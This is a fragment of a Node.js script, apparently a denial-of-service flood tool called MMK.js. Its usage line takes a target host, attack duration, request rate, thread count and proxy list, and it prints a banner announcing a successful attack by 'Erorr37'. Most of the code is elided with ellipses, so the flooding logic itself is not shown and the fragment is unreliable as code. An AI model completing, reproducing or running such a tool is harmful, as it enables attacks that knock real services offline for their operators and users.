const net = require("net");
 ...
 if (process.argv.length < 7){console.log('example: node MMK.js <host> <time> <rps> <threads> <proxyfile>'); process.exit();}
 const headers = {};
...
`);
        console.log(" Succesfully Attack By Erorr37 Cyber Scurity!\n");
        console.log("╚╦════════════════════════════════════════════╦╝\n");
        console.log("╔═════╩════════════════════════════════════════════╩═════╗\n");
